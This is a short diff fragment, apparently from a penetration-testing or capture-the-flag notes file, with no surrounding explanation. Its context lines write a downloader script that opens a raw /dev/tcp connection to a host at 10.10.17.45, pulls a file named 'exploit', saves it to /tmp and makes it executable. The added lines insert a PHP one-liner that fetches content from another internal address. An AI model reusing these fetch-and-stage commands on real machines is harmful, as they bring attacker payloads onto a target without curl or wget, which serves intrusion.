@@ -118,3 +118,8 @@ exec 3<>/dev/tcp/10.10.17.45/8000
 echo -e "GET /exploit HTTP/1.0\r\nHost: 10.10.17.45\r\n\r\n" >&3
 cat <&3 | tail -n +$(($(grep -anm1 "^$" <&3 | cut -d: -f1) + 1)) > /tmp/exploit
 chmod +x /tmp/exploit' > /tmp/downloader.sh && chmod +x /tmp/downloader.sh
+
+
+php -r "echo file_get_contents('http://10.43.2.241:5000/');"
+
+
